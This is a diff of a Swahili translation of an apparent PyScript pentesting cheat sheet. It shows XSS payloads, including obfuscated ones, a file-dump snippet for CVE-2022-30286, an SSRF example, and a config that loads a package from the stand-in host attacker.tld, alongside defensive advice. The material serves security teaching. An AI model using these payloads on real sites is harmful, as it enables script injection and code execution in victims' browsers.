@@ -1,10 +1,12 @@
 # Pyscript
 
-## Mwongozo wa Pentesting wa PyScript
+{{#include ../../banners/hacktricks-training.md}}
 
-PyScript ni framework mpya iliyoundwa kwa ajili ya kuunganisha Python kwenye HTML ili iweze kutumiwa pamoja na HTML. Katika cheat sheet hii, utapata jinsi ya kutumia PyScript kwa madhumuni yako ya pentesting.
+## Mwongozo wa PyScript Pentesting
 
-### Kuhifadhi / Kupata files kutoka kwenye Emscripten virtual memory filesystem:
+PyScript ni framework mpya iliyoundwa kwa ajili ya kuunganisha Python kwenye HTML, hivyo inaweza kutumika pamoja na HTML. Katika cheat sheet hii, utapata jinsi ya kutumia PyScript kwa madhumuni yako ya pentesting.
+
+### Kudump / Kupata files kutoka kwenye mfumo wa faili wa virtual memory wa Emscripten:
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
@@ -15,11 +17,11 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 = fin.read() print(out)
 </py-script>
 ```
-Matokeo:
+Result:
 
-![PyScript Pentesting Guide - Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+![Mwongozo wa PyScript Pentesting - Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [OOB Data Exfiltration ya Emscripten virtual memory filesystem (ufuatiliaji wa console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPkP5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [OOB Data Exfiltration ya Emscripten virtual memory filesystem (ufuatiliaji wa console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
@@ -51,13 +53,13 @@ Matokeo:
 
 ### Cross Site Scripting (Kawaida)
 
-Code:
+Msimbo:
 ```python
 <py-script>
 print("<img src=x onerror='alert(document.domain)'>")
 </py-script>
 ```
-Result:
+Matokeo:
 
 ![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
@@ -75,13 +77,13 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-Matokeo:
+Result:
 
 ![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
 ### Cross Site Scripting (JavaScript Obfuscation)
 
-Msimbo:
+Code:
 ```html
 <py-script>
 prinht(""
@@ -168,11 +170,11 @@ Matokeo:
 
 ---
 
-## Athari mpya na techniques (2023-2025)
+## Vulnerabilities na techniques mpya (2023-2025)
 
-### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
+### Server-Side Request Forgery kupitia uncontrolled redirects (CVE-2025-50182)
 
-`urllib3 >= 2.2.0, < 2.5.0` hupuuza parameters za `redirect` na `retries` za request inapotumiwa na Pyodide's browser transport. Ikiwa attacker anaweza kudhibiti target URLs, code inaweza kufuata cross-domain redirects hata inapoiomba urllib3 izizime, hivyo kudhoofisha ulinzi wa SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0` hupuuza request parameters za `redirect` na `retries` inapotumiwa pamoja na browser transport ya Pyodide. Ikiwa attacker anaweza kuathiri target URLs, code inaweza kufuata cross-domain redirects hata inapoiomba urllib3 kuzizima, hivyo kudhoofisha SSRF defenses.<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
@@ -186,11 +188,11 @@ redirect=False,
 print(r.status, r.url)
 </script>
 ```
-Pata toleo la `urllib3 >= 2.5.0` kwa Node.js, lakini usitegemee urllib3 kuzima redirects kwenye browsers; hakikisha au tumia allow-list ya destinations kabla ya kufanya requests.<sup>[[4]](#references)</sup>
+Pata toleo la `urllib3 >= 2.5.0` kwa Node.js, lakini usitegemee urllib3 kuzima redirects katika vivinjari; badala yake, validate au allow-list destinations kabla ya kufanya requests.<sup>[[4]](#references)</sup>
 
-### Upakiaji wa package kiholela na supply-chain attacks
+### Upakiaji wa packages kiholela na supply-chain attacks
 
-Configuration ya Pyodide ya PyScript inakubali wheel URLs kiholela kwenye `packages`; ikiwa attacker anaweza kurekebisha au kuingiza configuration hiyo, import inayofuata inaweza kuendesha Python inayodhibitiwa na attacker kwenye browser ya victim.<sup>[[5]](#references)[[6]](#references)</sup>
+Usanidi wa Pyodide wa PyScript unakubali wheel URLs kiholela katika `packages`; ikiwa attacker anaweza kurekebisha au kuingiza usanidi huo, import inayofuata inaweza kutekeleza Python inayodhibitiwa na attacker katika browser ya victim.<sup>[[5]](#references)[[6]](#references)</sup>
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
@@ -199,12 +201,12 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code at import
 </script>
 ```
-Pyodide inaweza kusakinisha pure-Python wheels kutoka kwenye URLs zisizo za kiholela bila kuhitaji build ya WebAssembly ya package.<sup>[[6]](#references)</sup> Weka usanidi huu chini ya udhibiti wa developer, ruhusu majina kamili ya packages au URLs kupitia allow-list, na uthibitishe wheel digests za remote wakati wa build au deployment.
+Pyodide inaweza kusakinisha pure-Python wheels kutoka URLs za kiholela bila build ya WebAssembly ya package.<sup>[[6]](#references)</sup> Weka configuration hii chini ya udhibiti wa developer, ruhusu majina halisi ya packages au URLs pekee, na uthibitishe remote wheel digests wakati wa build au deployment.
 
 ### Mabadiliko ya output sanitisation (2023+)
 
-* Katika implementation ya 2022.05.1 iliyotumika na mifano ya legacy, `print()` huandika output ya `text/plain` bila HTML escaping na hivyo iko katika hatari ya XSS.<sup>[[8]](#references)</sup>
-* `display()` helper ya sasa **hufanya HTML escaping kwa chaguo-msingi** kwa strings za kawaida; raw markup lazima ifungwe ndani ya `pyscript.HTML()`.<sup>[[2]](#references)</sup>
+* Katika implementation ya 2022.05.1 iliyotumiwa na mifano ya zamani, `print()` huandika output ya `text/plain` bila HTML escaping na hivyo iko hatarini kwa XSS.<sup>[[8]](#references)</sup>
+* `display()` helper ya sasa **hufanya HTML escaping kwa default** kwa plain strings; raw markup lazima ifungwe ndani ya `pyscript.HTML()`.<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
 
@@ -212,25 +214,25 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-Tumia `display()` kwa input isiyoaminika na usipitishie `HTML()` strings zisizoaminika.<sup>[[2]](#references)</sup>
+Tumia `display()` kwa input isiyoaminika na usipitishie strings zisizoaminika kwenye `HTML()`.<sup>[[2]](#references)</sup>
 
 ---
 
 ## Mbinu Bora za Kujilinda
 
-* **Weka packages katika hali ya kisasa** – tumia `urllib3 >= 2.5.0` katika Node.js na kagua tofauti assumptions za browser redirect.<sup>[[4]](#references)</sup>
-* **Punguza vyanzo vya packages** – ruhusu majina ya PyPI yaliyo kwenye allow-list au URLs sahihi zinazoaminika, na thibitisha digests za remote wheel wakati wa build au deployment.<sup>[[5]](#references)[[6]](#references)</sup>
-* **Imarisha Content Security Policy** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili blocks za `<script>` zilizodungwa zisiweze kutekelezwa.
-* **Kataza tags za `<py-script>` / `<script type="py">` zinazotolewa na mtumiaji** – safisha HTML kwenye server kabla ya kuirudisha kwa users wengine.
-* **Tenga workers** – ikiwa huhitaji access ya synchronous kwa DOM kutoka kwa workers, wezesha flag ya `sync_main_only` ili kuepuka `SharedArrayBuffer` na mahitaji yake yanayohusiana na CORS headers.<sup>[[5]](#references)</sup>
+* **Weka packages katika hali ya kisasa** – tumia `urllib3 >= 2.5.0` katika Node.js na kagua assumptions za browser redirect kando.<sup>[[4]](#references)</sup>
+* **Zuia vyanzo vya packages** – ruhusu kwa allow-list majina ya PyPI au URLs sahihi zinazoaminika, na thibitisha digests za wheel za mbali wakati wa build au deployment.<sup>[[5]](#references)[[6]](#references)</sup>
+* **Imarisha Content Security Policy** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili blocks za `<script>` zilizoingizwa zisiweze kutekelezwa.
+* **Kataza tags za `<py-script>` / `<script type="py">` zinazotolewa na mtumiaji** – safisha HTML kwenye server kabla ya kuirudisha kwa watumiaji wengine.
+* **Tenga workers** – ikiwa huhitaji ufikiaji wa synchronous wa DOM kutoka kwa workers, wezesha flag ya `sync_main_only` ili kuepuka `SharedArrayBuffer` na mahitaji yake yanayohusiana na headers za CORS.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-- [2] [Documentation ya PyScript Built-ins – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
-- [3] [Cyber Guy - Sanaa ya Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [2] [Nyaraka za Built-ins za PyScript – `display` na `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - Sanaa ya Kuunganisha Vulnerabilities (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
 - [4] [Ushauri wa usalama wa urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
-- [5] [Documentation ya usanidi wa PyScript – packages na `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [5] [Nyaraka za configuration za PyScript – packages na `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
 - [6] [Pyodide – Kupakia packages](https://pyodide.org/en/stable/usage/loading-packages.html)
 - [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
 - [8] [Utekelezaji wa `pyscript.py` wa PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
